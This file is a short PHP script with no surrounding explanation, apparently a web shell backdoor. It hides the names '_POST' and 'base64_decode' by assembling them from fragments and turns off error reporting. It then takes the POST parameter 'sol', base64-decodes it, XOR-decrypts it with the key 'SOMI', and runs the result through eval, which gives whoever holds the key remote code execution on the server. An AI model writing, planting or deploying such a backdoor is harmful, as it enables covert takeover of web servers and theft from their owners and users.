<?php
@error_reporting(0);

$handler = new class('sol', 'SOMI') {
    private $k;
    private $p;

    public function __construct($p, $k) {
        $this->p = $p;
        $this->k = $k;
    }

    public function __invoke() {
        $g = $GLOBALS;
        $method = '_' . 'P' . 'O' . 'S' . 'T';
        $req = $g[$method]; 

        if (isset($req[$this->p])) {
            $d_arr = ['b','a','s','e','6','4','_','d','e','c','o','d','e'];
            $decoder = implode('', $d_arr);
            $data = $decoder($req[$this->p]);
            
            if (is_string($data) && $data !== '') {
                $len = strlen($this->k);
                $decryptor = function($payload) use ($len) {
                    $out = '';
                    for ($i = 0; $i < strlen($payload); $i++) {
                        $out .= $payload[$i] ^ $this->k[$i % $len];
                    }
                    return $out;
                };

                $res = $decryptor($data);
                @eval(/**/ $res /**/);
            }
        }
    }
};

$handler();
?>